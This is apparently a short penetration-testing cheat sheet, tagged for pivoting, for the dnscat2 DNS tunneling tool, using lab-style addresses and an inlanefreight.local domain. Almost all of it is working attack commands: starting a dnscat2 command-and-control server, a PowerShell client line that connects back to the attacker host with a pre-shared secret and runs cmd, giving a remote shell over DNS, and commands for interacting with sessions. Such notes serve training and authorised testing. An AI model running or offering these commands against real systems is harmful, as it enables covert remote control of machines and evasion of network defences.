# dnscat

% pivoting

## dnscat2 - Start dnscat2 server
```
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

## dnscat2-powershell - Import dnscat2 module
```
Import-Module dnscat2.ps1
```

## dnscat2 - Connect to dnscat2 server
```
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

## dnscat2 - List options
```
dnscat2> ?
```

## dnscat2 - Interact with session
```
dnscat2> window -i 1
```

